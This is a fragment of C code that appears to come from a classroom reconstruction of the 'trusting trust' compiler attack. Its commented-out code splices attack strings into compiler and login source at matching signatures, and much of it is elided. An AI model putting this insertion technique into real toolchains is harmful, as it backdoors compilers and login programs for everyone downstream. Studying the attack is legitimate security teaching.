...
#include "attack-quine.c"
  ...
  // static char compile_attack[] = prog;

  // char* location = strstr(program, compile_sig);
  // if (location) {
  //     //First copy everything after needle to the point it needs to be for
  //     correct spacing int compile_sig_len = strlen(compile_sig); int
  //     compile_attack_len = strlen(compile_attack);

  //     strcpy(location + compile_sig_len + compile_attack_len, location +
  //     compile_sig_len);

  //     //Then copy in the attack
  //     strncpy(location + compile_sig_len, compile_attack,
  //     compile_attack_len);
  // }
  ...
  // if (location) {
  //     //First copy everything after needle to the point it needs to be for
  //     correct spacing int login_sig_len = strlen(login_sig); int
  //     login_attack_len = strlen(login_attack);

  //     strcpy(location + login_sig_len + login_attack_len, location +
  //     login_sig_len);
